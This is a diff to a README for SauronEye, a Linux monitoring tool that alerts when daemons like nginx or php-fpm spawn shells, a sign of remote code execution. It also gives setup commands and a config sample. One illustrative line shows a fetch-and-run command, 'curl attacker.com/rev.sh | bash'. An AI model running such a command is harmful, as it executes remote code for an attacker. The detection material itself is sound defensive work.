@@ -135,6 +135,60 @@ recipient_number = "5511999999999"
 
 ---
 
+## 🛡️ Understanding `protected_services` & RCE Defense
+
+### How It Works
+
+Network daemons (such as Nginx, Apache, PHP-FPM, BIND/Named, Unbound, MySQL, and Redis) are designed to handle network traffic — **never** to invoke interactive command-line shells.
+
+When an attacker successfully exploits a Remote Code Execution (RCE) or file upload vulnerability, the exploited daemon inevitably spawns a shell or utility binary:
+```text
+[nginx / php-fpm]  ──(anomalous spawn)──►  /bin/bash -c "curl attacker.com/rev.sh | bash"
+```
+
+**SauronEye** continuously inspects the Linux `/proc` filesystem and tracks process lineage (`PPID` ➔ `PID`). If a process whose parent command name matches **`protected_services`** attempts to execute any binary defined in **`forbidden_children`**, SauronEye intercepts the event in milliseconds and dispatches a **Critical Security Alert** containing:
+- Monitored Service Name & Parent PID (`PPID`);
+- Spawned Child Process Name & PID;
+- Full command-line invocation (`cmdline`).
+
+### How to Identify Active Daemons on Your Server
+
+To discover the exact process names (`comm`) running on your server and populate `protected_services`:
+
+1. **List listening services and their PIDs:**
+   ```bash
+   sudo ss -tulpn
+   ```
+2. **Find the exact kernel command name (`comm`):**
+   ```bash
+   # Replace <PID> with the actual process PID (e.g., 1100):
+   cat /proc/<PID>/comm
+   ```
+3. **Alternatively, inspect common daemons directly:**
+   ```bash
+   ps -eo comm,pid,user,args | grep -E "nginx|apache|httpd|php|named|unbound|bind|mysql|mariadb|postgres|redis"
+   ```
+4. **Add them to `config.toml`:**
+   ```toml
+   [rce_detector]
+   enabled = true
+   protected_services = [
+       "nginx",
+       "apache2",
+       "httpd",
+       "php-fpm8.2",
+       "named",
+       "unbound",
+       "mariadbd",
+       "mysqld",
+       "redis-server"
+   ]
+   ```
+
+> **Note:** Do **not** include interactive login services like `sshd` or `login` in `protected_services`, as their legitimate purpose is opening user shells upon valid authentication.
+
+---
+
 ## Installation & Deployment
 
 For complete installation steps, systemd service configuration, and security hardening, see **[INSTALL.md](INSTALL.md)**.
